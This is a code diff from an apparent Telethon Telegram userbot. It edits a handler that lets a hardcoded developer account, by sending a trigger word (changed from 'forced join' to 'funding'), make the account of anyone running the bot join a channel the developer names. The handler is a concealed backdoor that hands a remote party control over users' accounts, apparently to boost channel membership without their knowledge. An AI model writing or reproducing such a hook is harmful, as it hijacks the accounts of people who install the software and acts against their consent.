@@ -327,7 +327,7 @@ DevJoker = [705475246]
 
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("انضمام اجباري") and event.sender_id in DevJoker:
+    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
         message = event.message
         channel_username = None
         if len(message.text.split()) > 1:
@@ -335,11 +335,11 @@ async def Hussein(event):
         if channel_username:
             try:
                 await l313l(JoinChannelRequest(channel_username))
-                response = "تم الانضمام إلى القناة بنجاح!"
+                response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
             except ValueError:
-                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح للقناة."
+                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
         else:
-            response = "الرجاء تحديد معرف القناة بشكل صحيح مع الأمر."
+            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         await event.reply(response)
 
 
